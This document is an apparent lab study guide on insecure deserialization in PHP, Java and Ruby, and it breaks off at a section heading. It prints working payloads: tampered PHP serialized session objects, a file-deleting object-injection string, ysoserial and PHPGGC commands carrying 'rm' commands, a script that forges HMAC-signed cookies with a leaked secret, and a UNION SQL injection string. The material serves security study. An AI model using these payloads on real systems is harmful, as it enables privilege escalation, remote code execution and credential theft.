# Insecure Deserialization

**Category:** Insecure Deserialization  
**Severity:** High or Critical

---

## Definition

**Insecure Deserialization** occurs when an application takes serialized data from an untrusted source and deserializes it without properly validating or controlling what is being processed.

**Serialization** is the process of converting an object or data structure into a format that can be stored or transmitted. **Deserialization** is the reverse process, where that data is converted back into an object that the application can use.

The vulnerability appears when the application **trusts serialized data that can be modified by an attacker**.

In simple terms:

```text
Object
   |
   | Serialization
   v
Serialized Data
   |
   | Sent to / stored by application
   v
Attacker modifies the data
   |
   | Deserialization
   v
Application reconstructs the object


## Modifying Serialized Objects

* **The Objective:** Exploit insecure deserialization by modifying a serialized object stored in a session cookie. The goal is to change the user's privilege level from a normal user to an administrator and access administrative functionality.

* **The Mechanism:** The application stores session information inside a serialized PHP object. The object contains an `admin` attribute that determines whether the user has administrative privileges. Because the application trusts the serialized object received from the client without adequately validating its integrity, an attacker can modify the serialized data and change the value of the `admin` attribute.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | URL/Base64 decoding
      v
Serialized PHP Object
      |
      | Modify object attribute
      v
admin = false
      |
      | Change to
      v
admin = true
      |
      v
Application Deserializes Object
      |
      v
Administrative Privileges
```

* **The Session Cookie:** The application stores the serialized session object inside a client-side cookie. The cookie may appear unreadable because it is URL-encoded and Base64-encoded.

* **The Decoded Object:** After decoding the cookie, the underlying serialized PHP object can be inspected. A simplified representation may look like:

```text
admin = false
```

In PHP serialization, a boolean value is represented using the `b` type:

```text
b:0
```

represents:

```text
false
```

while:

```text
b:1
```

represents:

```text
true
```

* **The Vulnerability:** The application trusts security-sensitive values contained within the serialized object. Since the object is stored on the client side and is not protected against modification, an attacker can alter the privilege-related attribute before sending the cookie back to the server.

* **Modifying the Serialized Object:** The attacker changes the serialized `admin` attribute from:

```text
b:0
```

to:

```text
b:1
```

Conceptually:

```text
Before:
admin = false

After:
admin = true
```

The modified object is then re-encoded and supplied as the session cookie.

* **The Deserialization Process:** When the server receives the modified cookie, it decodes and deserializes the object. If there is no integrity validation, the application accepts the modified `admin` value and treats the attacker as an administrator.

* **The Privilege Escalation:**

```text
Normal User
    |
    | Modified session object
    v
admin = true
    |
    v
Application deserializes object
    |
    v
Administrator privileges
    |
    v
/admin
```

* **The Administrative Functionality:** Once the modified session is accepted, administrative functionality becomes accessible. The administrative interface may expose privileged operations such as viewing users or deleting accounts.

* **Example Administrative Request:**

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Administrative Action:** An administrative endpoint may provide functionality such as deleting a user:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Core Concept:** The important issue is not simply that the application uses serialization. The vulnerability occurs because **security-sensitive serialized data is controlled by the client and is trusted after deserialization without sufficient integrity protection or server-side validation**.

* **The Security Impact:** Insecure deserialization of modifiable session objects can lead to privilege escalation, authentication bypass, unauthorized administrative actions, account manipulation, and potentially more severe attacks depending on the capabilities of the serialized object and the deserialization process.
# Insecure Deserialization

## Modifying Serialized Data Types

* **The Objective:** Exploit insecure deserialization by modifying the data types inside a serialized session object. The goal is to bypass authentication and make the application treat the attacker as the `administrator` user.

* **The Mechanism:** The application stores authentication information inside a serialized PHP object. The object contains a `username` attribute and an `access_token` attribute. Because the serialized object is stored in a client-controlled session cookie and is not adequately protected, the attacker can modify both the values and their underlying data types.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | Decode
      v
Serialized PHP Object
      |
      | Modify values and data types
      v
username = administrator
access_token = integer 0
      |
      v
Application Deserializes Object
      |
      | Weak type comparison
      v
Authentication Bypass
      |
      v
Administrator Account
```

* **The Serialized Object:** A simplified PHP serialized object may contain fields similar to:

```text
O:4:"User":2:{
    s:8:"username";s:6:"wiener";
    s:12:"access_token";s:32:"RANDOM-TOKEN";
}
```

The important fields are the `username` and `access_token` values.

* **The Vulnerability:** The application relies on serialized client-side data when determining the user's identity. If the application also performs weak comparisons between values of different data types, changing the serialized data type can cause an unexpected authentication result.

* **The Data Type Modification:** PHP serialization identifies the type of each value. For example:

```text
s
```

represents a string, while:

```text
i
```

represents an integer.

Therefore:

```text
s:32:"RANDOM-TOKEN";
```

represents a string, while:

```text
i:0;
```

represents the integer `0`.

* **The Authentication Bypass:** The attacker modifies the serialized object so that the username becomes `administrator` and the access token becomes the integer `0`.

```text
Before:

username = wiener
access_token = "RANDOM-TOKEN"

After:

username = administrator
access_token = 0
```

* **Modified Serialized Object:**

```text
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

The important changes are:

```text
s:6:"wiener"
        |
        v
s:13:"administrator"
```

and:

```text
s:32:"RANDOM-TOKEN"
        |
        v
i:0
```

* **The Type Confusion:** The application expects the access token to be a string but receives an integer instead. Under weak comparison behavior in PHP 7.x and earlier, comparisons between different data types can produce unexpected results. This can cause an attacker-controlled value such as `0` to satisfy an authentication check that should require a valid token.

* **The Deserialization Process:** The modified cookie is sent back to the server. The application decodes and deserializes the object, resulting in:

```text
username = administrator
access_token = 0
```

If the authentication check uses a weak comparison, the application may accept the modified object as a valid authenticated session.

* **The Privilege Escalation:**

```text
Normal User
    |
    | Modify serialized object
    v
username = administrator
access_token = integer 0
    |
    v
Weak type comparison
    |
    v
Authentication Bypass
    |
    v
Administrator Account
```

* **Example Modified Session Object:**

```http
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

The modified session cookie contains the serialized object with the altered username and access-token type.

* **The Administrative Access:** Once the authentication check is bypassed, the application treats the attacker as the `administrator` user and exposes administrative functionality such as `/admin`.

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Administrative Action:** Administrative functionality may expose endpoints capable of modifying or deleting other users:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
```

* **Core Concept:** The important issue is that insecure deserialization can allow an attacker to manipulate not only the **values** stored in a serialized object, but also their **data types**. When this is combined with weak type comparisons, a value of an unexpected type can bypass authentication logic.

* **The Security Impact:** Modifying serialized data types can result in authentication bypass, privilege escalation, unauthorized account access, and administrative actions. Applications should avoid trusting client-controlled serialized objects and should use strict type comparisons and server-side validation for security-sensitive authentication data.

## Using Application Functionality to Exploit Insecure Deserialization

* **The Objective:** Exploit insecure deserialization by modifying a serialized object so that an existing application feature uses an attacker-controlled file path. The goal is to abuse the account deletion functionality to delete a file from another user's home directory.

* **The Mechanism:** The application stores session data inside a serialized object. One of the object's attributes, `avatar_link`, contains a file path associated with the user's avatar. A dangerous application method uses this value during account deletion. Because the serialized object can be modified by the client, the attacker can change `avatar_link` to point to an arbitrary file.

* **Core Layout Structure:**

```text
Session Cookie
      |
      | Decode serialized object
      v
avatar_link = /path/to/avatar
      |
      | Modify serialized value
      v
avatar_link = /home/carlos/morale.txt
      |
      v
Application Functionality
      |
      | Account deletion
      v
Dangerous File Operation
      |
      v
Target File Deleted
```

* **The Serialized Object:** The session cookie contains a serialized PHP object with attributes representing information associated with the user's account. One of these attributes may resemble:

```text
s:11:"avatar_link";s:23:"/path/to/avatar"
```

The `s:23` portion specifies the length of the string stored in the attribute.

* **The Vulnerability:** The application uses a client-controlled serialized attribute as an input to a sensitive file operation. The application does not adequately validate that the supplied file path belongs to the current user's permitted directory.

* **Modifying the File Path:** The attacker changes the `avatar_link` attribute so that it points to the target file:

```text
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

The string-length value must match the length of the new path.

* **The Dangerous Application Functionality:** The vulnerability becomes exploitable because the application already contains functionality that performs a file operation using `avatar_link`. In this case, deleting the user's account causes the application to process the avatar file associated with the serialized object.

* **The Attack Flow:**

```text
Attacker
   |
   | Modified session object
   v
avatar_link = /home/carlos/morale.txt
   |
   v
POST /my-account/delete
   |
   v
Application processes avatar_link
   |
   v
File operation on attacker-controlled path
   |
   v
/home/carlos/morale.txt deleted
```

* **Example Request:**

```http
POST /my-account/delete HTTP/1.1
Host: target.com
Cookie: session=MODIFIED_SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

```

The important part of the request is the modified serialized session object contained within the session cookie.

* **The Key Concept:** Insecure deserialization does not always require injecting a completely new object or directly invoking a dangerous function. An attacker may instead modify an existing object property and then trigger legitimate application functionality that already performs a dangerous operation using that property.

* **The Security Impact:** If serialized object properties are trusted without validation, attackers may manipulate file paths, URLs, commands, or other sensitive values consumed by application functionality. Depending on the available methods, this can lead to arbitrary file deletion, file access, path traversal, privilege escalation, or potentially remote code execution.

## Arbitrary Object Injection in PHP

* **The Objective:** Exploit PHP object deserialization to inject an attacker-controlled serialized object into a session cookie. The goal is to create an object whose magic method performs a dangerous file operation when the object is destroyed.

* **The Mechanism:** PHP allows objects to define magic methods such as `__destruct()`, which is automatically invoked when an object is destroyed. If an application deserializes attacker-controlled data and the corresponding class contains a dangerous magic method, an attacker may be able to create an instance of that class and control the properties used by the method.

* **Core Layout Structure:**

```text
Attacker-Controlled Serialized Object
              |
              v
        PHP unserialize()
              |
              v
      Object Instantiated
              |
              v
       __destruct() Called
              |
              v
   Dangerous Method Executed
              |
              v
      File Operation
```

* **The Source Code:** To perform arbitrary object injection, the attacker generally needs to identify a suitable class and understand how its methods use object properties. Source code may reveal classes that contain dangerous magic methods.

* **The Vulnerable Class:** A vulnerable application may contain a class similar to:

```php
class CustomTemplate
{
    private $lock_file_path;

    function __destruct()
    {
        unlink($this->lock_file_path);
    }
}
```

The important part is that `__destruct()` automatically calls `unlink()` using the value stored in `lock_file_path`.

* **The Dangerous Magic Method:** The `__destruct()` method is automatically executed when the object is destroyed. If an attacker can control the object's properties through deserialization, the method may perform an operation on an attacker-selected path.

* **The Object Injection:** The attacker creates a serialized instance of the vulnerable class and assigns a target file path to the dangerous property:

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

The serialized structure represents:

```text
Class: CustomTemplate
Property: lock_file_path
Value: /home/carlos/morale.txt
```

* **The Serialization Structure:** PHP serialized objects contain type identifiers and length indicators. For example:

```text
O:14:"CustomTemplate"
```

represents an object whose class name is `CustomTemplate`.

The following section:

```text
s:14:"lock_file_path"
```

represents the property name, while:

```text
s:23:"/home/carlos/morale.txt"
```

represents the string value and its length.

* **The Malicious Object:**

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

The attacker then encodes the serialized object in the format expected by the application, such as Base64 and URL encoding, before placing it into the session cookie.

* **The Session Cookie:** The application expects serialized session data inside a client-controlled cookie:

```http
Cookie: session=ENCODED_SERIALIZED_OBJECT
```

If the application passes this data to PHP's deserialization functionality without validating the object type or its contents, the attacker can replace the legitimate object with the malicious one.

* **The Deserialization Process:**

```text
Session Cookie
      |
      | Base64/URL decode
      v
Serialized CustomTemplate Object
      |
      | unserialize()
      v
CustomTemplate Instance
      |
      v
__destruct()
      |
      | unlink(lock_file_path)
      v
Target File
```

* **The File Operation:** When the malicious object is destroyed, the `__destruct()` method uses the attacker-controlled `lock_file_path` value. In the vulnerable scenario, this causes the application to execute a file deletion operation against the supplied path.

* **Core Concept:** Arbitrary object injection occurs when an attacker can control serialized PHP data and cause the application to instantiate an object of a class that was not intended to be created with attacker-controlled properties.

The attacker does not necessarily inject executable PHP code directly. Instead, they abuse an existing class and its methods to make the application perform a dangerous operation.

* **The Security Impact:** PHP arbitrary object injection can lead to arbitrary file deletion, file access, privilege escalation, command execution, or remote code execution when suitable gadget classes and dangerous magic methods are available in the application's codebase.

## Exploiting Java Deserialization with Apache Commons

* **The Objective:** Exploit Java deserialization by injecting a malicious serialized object that uses an available Apache Commons Collections gadget chain to trigger a command on the server.

* **The Mechanism:** The application stores session information in a serialized Java object. During deserialization, Java reconstructs objects contained in the serialized data. If the application's classpath contains vulnerable gadget classes, an attacker can use a pre-built gadget chain to cause unintended code execution when the object is deserialized.

* **Core Layout Structure:**

```text
Attacker-Controlled Serialized Object
              |
              v
       Java Deserialization
              |
              v
   Apache Commons Gadget Chain
              |
              v
      Method Invocation
              |
              v
     Command Execution
```

* **The Serialized Session:** The application stores a serialized Java object inside a session cookie:

```http
Cookie: session=ENCODED_SERIALIZED_OBJECT
```

The serialized object can be extracted and analyzed to determine that the application is using Java serialization.

* **The Gadget Chain:** A gadget chain is a sequence of existing classes and methods that can be linked together so that deserialization eventually reaches a dangerous operation. In this case, the application loads **Apache Commons Collections**, which provides classes that can be used as part of a known Java deserialization gadget chain.

* **The Vulnerability:** The application deserializes attacker-controlled Java objects without sufficiently restricting the classes that can be instantiated. Because the required gadget classes are available in the application's classpath, an attacker can construct a serialized object that triggers unintended behavior during deserialization.

* **Generating the Malicious Object:** A tool such as `ysoserial` can generate serialized objects containing pre-built gadget chains. A gadget such as `CommonsCollections4` can be selected to generate a payload containing a command.

```bash
java -jar ysoserial-all.jar CommonsCollections4 'COMMAND' | base64
```

The resulting output is a Base64-encoded serialized Java object.

* **Java 16+ Compatibility:** Modern Java versions may require additional module-opening arguments when running older gadget-generation tools:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'COMMAND' | base64
```

* **Example Payload:** In a controlled lab environment, the generated command can perform an intended file operation:

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

The important point is that the command is embedded inside the serialized gadget chain rather than being sent as ordinary application input.

* **The Payload Encoding:** The generated serialized object is Base64-encoded so that it can be transported through the session cookie. If the application expects URL-encoded cookie values, the generated payload must also be URL-encoded before being placed into the request.

* **The Deserialization Process:**

```text
Base64/URL-Encoded Cookie
          |
          v
    Decode Payload
          |
          v
 Java Object Deserialization
          |
          v
CommonsCollections4 Gadget Chain
          |
          v
   Dangerous Method Chain
          |
          v
      Command Execution
```

* **The Session Cookie:** The malicious serialized object replaces the legitimate session object:

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=URL_ENCODED_MALICIOUS_OBJECT
```

When the application processes the request, it deserializes the supplied object.

* **The Gadget Execution:** During deserialization, the gadget chain causes a sequence of existing Java classes and methods to execute. Eventually, the command embedded in the generated object is reached.

* **Core Concept:** Java deserialization vulnerabilities become especially dangerous when attacker-controlled serialized data can instantiate classes from libraries already present in the application. Gadget chains allow an attacker to combine otherwise ordinary classes and methods into an unintended execution path.

```text
Untrusted Serialized Data
          |
          v
      Deserialization
          |
          v
   Available Gadget Classes
          |
          v
      Gadget Chain
          |
          v
    Arbitrary Command
          |
          v
 Remote Code Execution
```

* **The Security Impact:** Unsafe Java deserialization can result in arbitrary code execution, command execution, privilege escalation, authentication bypass, data theft, file manipulation, and complete server compromise. The risk is particularly significant when commonly used libraries expose classes that can be chained into exploitable gadget sequences.

## Exploiting PHP Deserialization with a Pre-Built Gadget Chain

* **The Objective**

  * Exploit insecure PHP deserialization when the application uses a signed, serialized session cookie.
  * Identify the PHP framework and obtain the secret key used to sign the cookie.
  * Generate a malicious serialized object using a pre-built gadget chain.
  * Create a valid signed cookie containing the malicious object.
  * Trigger remote code execution through the deserialization process.

* **The Mechanism**

  * The application stores session data inside a client-side cookie.
  * The cookie contains:

    * A Base64-encoded serialized PHP object.
    * An HMAC-SHA1 signature used to detect tampering.
  * Normally, modifying the serialized object invalidates the signature.
  * If the signing secret is exposed, an attacker can:

    1. Generate a malicious serialized object.
    2. Sign it with the leaked secret.
    3. Submit the forged cookie.
    4. Cause the server to deserialize and execute the gadget chain.

### Core Layout Structure

```text
Client
  |
  v
Signed Session Cookie
  |
  +-- token -> Base64 -> Serialized PHP Object
  |
  +-- sig_hmac_sha1 -> HMAC-SHA1(token, SECRET_KEY)
  |
  v
Web Application
  |
  +-- Verify Signature
  |
  +-- Base64 Decode
  |
  +-- PHP Deserialize
  |
  v
Symfony Gadget Chain
  |
  v
Remote Code Execution
```

* **The Session Cookie**

  * The cookie conceptually contains a structure similar to:

```text
{
  "token": "<BASE64-SERIALIZED-OBJECT>",
  "sig_hmac_sha1": "<HMAC-SHA1-SIGNATURE>"
}
```

* The `token` contains the serialized PHP object.

* The signature is calculated from the token and a server-side secret.

* **The Vulnerability**

  * PHP deserialization becomes dangerous when attacker-controlled serialized objects can reach `unserialize()`.
  * A signature can normally prevent object modification, but it does not make deserialization itself safe.
  * If the secret used to generate the signature is disclosed, the attacker can create a valid signature for a malicious object.

* **Framework Identification**

  * Error messages, debug files, exposed configuration, or other information leaks may reveal the framework and version.
  * In this technique, identifying the framework is important because pre-built gadget chains are generally framework/version dependent.

```text
Information Leak
      |
      v
Framework + Version
      |
      v
Select Compatible Gadget Chain
```

* **Secret Key Disclosure**

  * A debug or information page may expose environment variables or application configuration.
  * If the HMAC secret is exposed, it can be used to generate valid signatures for attacker-controlled serialized objects.

```text
SECRET_KEY
    |
    v
HMAC-SHA1(
    malicious_serialized_object,
    SECRET_KEY
)
    |
    v
Valid Signature
```

* **Pre-Built Gadget Chains**

  * PHPGGC (PHP Generic Gadget Chains) can generate serialized objects for known PHP gadget chains.
  * A gadget chain abuses existing classes and magic methods within installed frameworks or libraries.
  * The attacker does not necessarily need source-code access if the framework and compatible gadget chain are known.

* **Generating the Malicious Object**

  * For a Symfony RCE gadget chain, PHPGGC can be used to generate a serialized object containing the desired command:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

* The output is a Base64-encoded serialized PHP object.

* The generated object becomes the `token` value in the forged session cookie.

* **Constructing the Signed Cookie**

  * The malicious object must be signed using the application's leaked secret key.
  * A PHP script can calculate the HMAC and construct the required cookie structure:

```php
<?php

$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";

$cookie = urlencode(
    '{"token":"' . $object .
    '","sig_hmac_sha1":"' .
    hash_hmac('sha1', $object, $secretKey) .
    '"}'
);

echo $cookie;
```

* **Forged Cookie Structure**

```text
Malicious Serialized Object
          |
          v
       Base64
          |
          v
       token
          |
          +----> HMAC-SHA1(token, SECRET_KEY)
                         |
                         v
                    sig_hmac_sha1
                         |
                         v
              URL-encoded Cookie
```

* **Deserialization and Gadget Execution**

  * The application receives the forged cookie.
  * The HMAC is calculated and compared against the supplied signature.
  * Because the attacker knows the secret key, the signature is valid.
  * The application decodes the token and deserializes the malicious object.
  * Symfony's available gadget classes form a chain that reaches the intended dangerous operation.
  * The supplied command is ultimately executed by the vulnerable application context.

* **Attack Flow**

```text
1. Obtain a valid session cookie
          |
          v
2. Decode the cookie
          |
          v
3. Identify PHP serialization
          |
          v
4. Identify framework/version
          |
          v
5. Obtain leaked SECRET_KEY
          |
          v
6. Generate compatible gadget chain
          |
          v
7. Base64-encode serialized object
          |
          v
8. Calculate HMAC-SHA1 signature
          |
          v
9. Build forged session cookie
          |
          v
10. Submit cookie
          |
          v
11. PHP deserializes object
          |
          v
12. Gadget chain reaches command execution
```

* **Core Concept**

  * The critical issue is the combination of:

    * Client-controlled serialized objects.
    * Unsafe PHP deserialization.
    * A framework containing usable gadget classes.
    * Exposure of the signing secret.
  * A signed cookie does not prevent exploitation if the attacker can obtain the secret required to produce a valid signature.

* **The Security Impact**

  * Successful exploitation can result in:

    * Remote code execution.
    * Arbitrary operating-system commands.
    * File deletion or modification.
    * Access to application secrets.
    * Further compromise of the application or underlying server.
  * Pre-built gadget chains make exploitation possible even when application source code is unavailable.

## Exploiting Ruby Deserialization Using a Documented Gadget Chain

* **The Objective**

  * Exploit insecure Ruby deserialization in a Ruby on Rails application.
  * Identify that the session cookie contains a serialized Ruby object using `Marshal`.
  * Use a publicly documented gadget chain to construct a malicious serialized object.
  * Trigger remote code execution through the deserialization process.

* **The Mechanism**

  * Ruby applications can serialize objects using the `Marshal` format.
  * If an application deserializes attacker-controlled data, an attacker may be able to supply objects that cause unintended behavior during deserialization.
  * Ruby on Rails and its dependencies may contain classes that can be chained together to reach dangerous functionality.
  * A documented gadget chain can be adapted to execute attacker-controlled commands.

### Core Layout Structure

```text
Client
  |
  v
Session Cookie
  |
  v
Base64-Encoded Ruby Marshal Object
  |
  v
Ruby on Rails Application
  |
  v
Marshal Deserialization
  |
  v
Gadget Chain
  |
  v
Command Execution
```

* **The Session Cookie**

  * The session cookie contains a serialized Ruby object.
  * Ruby's `Marshal` format is used to represent the object and its associated data.
  * The serialized object is typically encoded before being placed into the cookie.

```text
Session Cookie
      |
      v
Encoded Data
      |
      v
Ruby Marshal Object
      |
      v
Application Deserialization
```

* **The Vulnerability**

  * The application trusts serialized data supplied through the session mechanism.
  * When this data is passed to Ruby's deserialization functionality, an attacker-controlled object can be reconstructed.
  * If suitable gadget classes are available, the deserialization process can trigger a chain of method calls leading to command execution.

* **Documented Gadget Chain**

  * Unlike attacks that require discovering a gadget chain from application source code, documented Ruby deserialization exploits can provide an existing chain for known Ruby/Rails environments.
  * A published gadget chain can be adapted by changing the command and output format.
  * The exact gadget chain depends on the Ruby and framework versions and the classes available in the application's environment.

```text
Known Ruby/Rails Environment
          |
          v
Documented Gadget Chain
          |
          v
Adapt Payload
          |
          v
Serialized Marshal Object
```

* **Generating the Malicious Object**

  * A documented Ruby deserialization gadget chain can be used to generate the malicious object.
  * The command executed by the payload can be changed to the desired operation.

```ruby
# Gadget-chain generation logic
# Change the command to the intended lab command.

command = "rm /home/carlos/morale.txt"
```

* The final payload should be Base64-encoded so it can be placed into the session cookie:

```ruby
puts Base64.encode64(payload)
```

* **Payload Encoding**

  * The generated Ruby `Marshal` object is Base64-encoded before being inserted into the cookie.
  * The cookie may also require URL encoding because Base64 data can contain characters that have special meaning in URLs.

```text
Ruby Object
    |
    v
Marshal Serialization
    |
    v
Base64 Encoding
    |
    v
URL Encoding
    |
    v
Session Cookie
```

* **Deserialization Process**

  * The application receives the session cookie.
  * The encoded value is decoded.
  * Ruby reconstructs the serialized object using `Marshal`.
  * During this process, the gadget chain causes the vulnerable classes to interact in an unintended sequence.
  * The chain eventually reaches the command-execution primitive.

* **Attack Flow**

```text
1. Obtain a normal session cookie
          |
          v
2. Identify Ruby Marshal serialization
          |
          v
3. Identify the Ruby/Rails environment
          |
          v
4. Locate a documented compatible gadget chain
          |
          v
5. Adapt the gadget chain
          |
          v
6. Set the desired command
          |
          v
7. Generate the Marshal payload
          |
          v
8. Base64-encode the payload
          |
          v
9. URL-encode the cookie value
          |
          v
10. Submit the malicious session cookie
          |
          v
11. Application deserializes the object
          |
          v
12. Gadget chain reaches command execution
```

* **Core Concept**

  * Ruby deserialization becomes dangerous when untrusted serialized objects are accepted and reconstructed by the application.
  * A documented gadget chain can turn this unsafe deserialization primitive into remote code execution without requiring direct access to the application's source code.
  * The important relationship is:

```text
Untrusted Marshal Data
        +
Unsafe Deserialization
        +
Available Gadget Chain
        =
Potential Remote Code Execution
```

* **The Security Impact**

  * Successful exploitation can allow:

    * Remote code execution.
    * Arbitrary operating-system commands.
    * File creation, modification, or deletion.
    * Access to application data and secrets.
    * Further compromise of the application server.
  * The availability of a documented gadget chain significantly lowers the amount of application-specific research required to exploit an unsafe Ruby deserialization endpoint.

## Developing a Custom Gadget Chain for Java Deserialization

* **The Objective**

  * Exploit insecure Java deserialization when a serialized Java object is accepted through a session cookie.
  * Obtain application source code and identify a class whose deserialization behavior can be abused.
  * Construct a custom serialized object that triggers SQL injection through the vulnerable class.
  * Use the resulting SQL injection to extract sensitive data from the database.

* **The Mechanism**

  * The application stores session information as a serialized Java object.
  * During deserialization, Java reconstructs the object and invokes its custom `readObject()` method.
  * If `readObject()` performs a dangerous operation using attacker-controlled object properties, the serialized object can become an entry point for another vulnerability.
  * In this case, a deserialized `ProductTemplate` object passes its `id` attribute into a SQL statement.

```text
Attacker-Controlled Cookie
          |
          v
Serialized Java Object
          |
          v
Java Deserialization
          |
          v
ProductTemplate.readObject()
          |
          v
Attacker-Controlled id
          |
          v
SQL Query
          |
          v
SQL Injection
          |
          v
Database Data
```

* **The Session Cookie**

  * The session cookie contains a Base64-encoded serialized Java object.
  * After Base64 decoding, the underlying data follows the Java serialization format.

```text
Session Cookie
      |
      v
Base64 Decode
      |
      v
Java Serialized Object
      |
      v
Object Deserialization
```

* **Source Code Discovery**

  * When source code or backup files are accidentally exposed, inspect classes involved in serialization and deserialization.
  * A vulnerable class may contain a custom `readObject()` method.
  * The important question is not simply whether a class is serializable, but what happens when its fields are processed during deserialization.

* **The Vulnerable Gadget**

  * The `ProductTemplate` class contains an `id` attribute.
  * Its `readObject()` method uses this value in a SQL statement.
  * Because the value originates from the serialized object, an attacker can control the SQL input by constructing a suitable `ProductTemplate`.

```text
Serialized ProductTemplate
          |
          v
id = attacker-controlled value
          |
          v
readObject()
          |
          v
SQL Statement
          |
          v
SQL Injection
```

* **Custom Gadget Chain**

  * Unlike attacks that rely on an existing third-party gadget chain, this technique builds the exploit from application-specific source code.
  * The serialized `ProductTemplate` acts as the entry point.
  * Its `readObject()` method becomes the execution point that passes attacker-controlled data into the SQL query.

```text
Custom Serialized Object
          |
          v
ProductTemplate
          |
          v
readObject()
          |
          v
SQL Injection
```

* **Testing the Injection**

  * A serialized `ProductTemplate` can be created with a simple apostrophe as its `id`.
  * When the application deserializes the object, the resulting database error can confirm that the value reaches the SQL query.
  * This establishes a chain of vulnerabilities:

```text
Java Deserialization
        +
Attacker-Controlled Object Field
        +
Unsafe SQL Construction
        =
SQL Injection
```

* **Payload Generation**

  * A small Java program can instantiate the vulnerable class, set its `id`, serialize the object, and Base64-encode the result.
  * A generic Java serialization program can be adapted for this purpose.

```java
ProductTemplate product = new ProductTemplate();
product.id = "PAYLOAD-HERE";

// Serialize product
// Base64-encode serialized output
```

* The resulting Base64 value can then be supplied as the session cookie.

* **Efficient Payload Modification**

  * Recompiling the Java program for every SQL injection payload is inefficient.
  * A serialized-object manipulation tool such as Hackvertor can be used to modify the serialized object's string value while automatically maintaining the required length information and Base64 encoding.

```text
Serialized Object
      |
      v
Modify id
      |
      v
Update String Length
      |
      v
Base64 Encode
      |
      v
Session Cookie
```

* **Serialized Object Structure**

  * Java serialization stores metadata about object classes and fields.
  * String values contain length information, so changing a string without updating its corresponding length can corrupt the serialized object.
  * Automated transformation helps keep these offsets consistent.

```text
Class Metadata
      |
      v
Field Definition
      |
      v
String Length
      |
      v
String Value
```

* **Extracting Database Information**

  * Once SQL injection is confirmed, the vulnerable `id` field can be used as the SQL injection point.
  * A `UNION`-based technique can be used to determine the structure of the query and identify useful output columns.
  * In the lab environment, the query contains 8 columns.

* **Column Identification**

  * Determine which columns accept string values.
  * Error messages can be particularly useful when the database reflects attacker-controlled input.
  * The objective is to find a column or error condition that allows database content to become visible in the application's response.

* **Database Enumeration**

  * Once the query structure is understood, database metadata can be queried to identify relevant tables and columns.
  * The target data in this lab is stored in a `users` table with a `password` column.

```text
SQL Injection
      |
      v
Database Enumeration
      |
      v
users table
      |
      v
password column
      |
      v
Administrator Password
```

* **Example Error-Based UNION Payload**

  * A suitable payload can force the database to convert the extracted password to an incompatible type, causing the value to appear in the resulting error message.

```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

* **Attack Flow**

```text
1. Obtain a normal serialized session cookie
          |
          v
2. Identify Java serialization
          |
          v
3. Discover exposed application source
          |
          v
4. Identify ProductTemplate
          |
          v
5. Analyze readObject()
          |
          v
6. Identify attacker-controlled SQL input
          |
          v
7. Serialize a custom ProductTemplate
          |
          v
8. Base64-encode the object
          |
          v
9. Submit the malicious session cookie
          |
          v
10. Confirm SQL injection
          |
          v
11. Enumerate database structure
          |
          v
12. Extract sensitive database data
```

* **Core Concept**

  * Java deserialization does not have to lead directly to remote code execution to be dangerous.
  * A deserialized object's methods can invoke other vulnerable application functionality.
  * Here, the custom gadget chain connects:

```text
Untrusted Serialized Object
          |
          v
ProductTemplate
          |
          v
readObject()
          |
          v
SQL Injection
          |
          v
Sensitive Data Extraction
```

* **The Security Impact**

  * Successful exploitation can allow:

    * SQL injection through a serialized object.
    * Unauthorized database queries.
    * Extraction of credentials and other sensitive information.
    * Account compromise when authentication data is exposed.
    * Further privilege escalation using the obtained credentials.
  * The key lesson is that insecure deserialization can act as a bridge into an otherwise separate vulnerability, such as SQL injection.

## Developing a Custom Gadget Chain for PHP Deserialization

* **The Objective**

  * Exploit insecure PHP deserialization by constructing a custom gadget chain from classes already present in the application.
  * Analyze exposed source code to understand how PHP magic methods interact during deserialization.
  * Build a malicious serialized object that reaches a command-execution primitive.
  * Trigger remote code execution through the application's session mechanism.

* **The Mechanism**

  * The application stores session data as a serialized PHP object.
  * During deserialization, PHP may invoke magic methods such as `__wakeup()` and `__get()`.
  * By controlling the properties of serialized objects, an attacker can cause these methods to interact in an unintended sequence.
  * The resulting chain can eventually reach a dangerous function such as `exec()`.

### Core Layout Structure

```text
Attacker-Controlled Session Cookie
              |
              v
       Serialized PHP Object
              |
              v
       PHP Deserialization
              |
              v
       CustomTemplate
              |
          __wakeup()
              |
              v
           Product
              |
              v
        DefaultMap object
              |
           __get()
              |
              v
       call_user_func()
              |
              v
            exec()
              |
              v
      Command Execution
```

* **Source Code Discovery**

  * Source code disclosure can reveal the classes and methods needed to construct a custom gadget chain.
  * Backup files created by editors may sometimes be accessible by appending `~` to the original filename.
  * For example:

```text
/cgi-bin/libs/CustomTemplate.php
```

* A backup copy may be accessible as:

```text
/cgi-bin/libs/CustomTemplate.php~
```

* **Identifying the First Gadget: `CustomTemplate`**

